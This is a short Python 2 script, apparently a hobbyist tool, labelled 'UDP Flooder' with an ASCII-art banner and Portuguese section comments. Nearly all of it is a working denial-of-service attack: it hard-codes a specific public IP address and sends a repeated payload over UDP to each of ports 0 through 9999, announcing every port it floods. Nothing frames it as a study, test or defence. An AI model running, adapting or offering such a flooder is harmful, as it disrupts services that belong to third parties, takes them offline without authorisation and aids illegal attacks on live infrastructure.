#--------INICIO---------#

#!/usr/bin/python
#
# UDP Flooder
# Coded 
#--------FIM---------#
print"  _____                           ___                                         "
print" (_   _)                        /'___)                       _                "
print"   | | _ __   _ _   ___    ___ | (__   _    _ __   ___ ___  (_)   ___    __   "
print"   | |( '__)/'_` )/' _ `\/',__)| ,__)/'_`\ ( '__)/' _ ` _ `\| | /'___) /'__`\ "
print"   | || |  ( (_| || ( ) |\__, \| |  ( (_) )| |   | ( ) ( ) || |( (___ (  ___/ "
print"   (_)(_)  `\__,_)(_) (_)(____/(_)  `\___/'(_)   (_) (_) (_)(_)`\____)`\____) "

#--------Prints---------#

import socket
from sys import exit

host = "104.17.188.107"
buff = "443" * 1000


for ip in range(0,10000):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, ip))
        s.send(buff)
        s.close()
        print "UDP Flooded port: %s" % ip
    except socket.error:
        s.close()
        print ("System Timeout")
        exit(1)


#--------FIM---------#
